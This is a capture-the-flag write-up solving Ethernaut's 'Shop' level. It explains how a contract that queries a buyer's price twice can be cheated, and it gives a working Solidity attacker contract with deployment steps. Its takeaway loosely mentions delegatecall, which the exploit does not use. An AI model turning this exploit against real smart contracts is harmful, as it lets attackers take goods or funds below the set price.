
# 🛒 Ethernaut Level #21: Shop – Solution

## 📜 Challenge Summary

The goal of this level is to **buy an item for less than the listed price** (100) from a vulnerable `Shop` contract.

The challenge lies in understanding the **order of execution** in the `buy()` function and exploiting how `view` functions can **read contract state** even though they can't modify it.

---

## 🧠 Vulnerability

In the `Shop` contract:

```solidity
if (_buyer.price() >= price && !isSold) {
    isSold = true;
    price = _buyer.price();
}
```

The function `price()` from the `Buyer` contract is **called twice**:

1. During the `require` check.
2. Again to **set the price**.

This means we can **return a high price the first time**, then a **low price the second time** — if we can dynamically change our behavior during the `view` function execution.

---

## 🧪 Exploitation Strategy

Even though `price()` must be a `view` function (i.e., no writes), it can still **read state from the `Shop` contract** via `msg.sender`.

So we:

* Call `isSold()` to determine whether this is the first or second call.
* Return `100` the first time (to pass the check), and `0` the second time (to reduce price).

---

## ✅ Solidity Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint);
}

contract Buyer {
    function price() external view returns (uint) {
        bool isSold = IShop(msg.sender).isSold();
        uint askedPrice = IShop(msg.sender).price();

        // First call: return full price. Second call: return 0.
        if (!isSold) {
            return askedPrice;
        }
        return 0;
    }

    function buyFromShop(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```

---

## 🛠️ How to Use

1. Deploy the `Buyer` contract.
2. Call `buyFromShop(shopAddress)` with the address of the target `Shop` contract.
3. The `Shop` will set `price = 0`, and `isSold = true`, satisfying the level requirements.

---

## 🔐 Takeaway

> Even `view` functions can leak information and **influence logic** when they're called within the context of a contract using `delegatecall` or when returning dynamic values from another contract's state. **Order of operations matters.**

This pattern shows how seemingly read-only behavior can be **exploited for logic manipulation**.
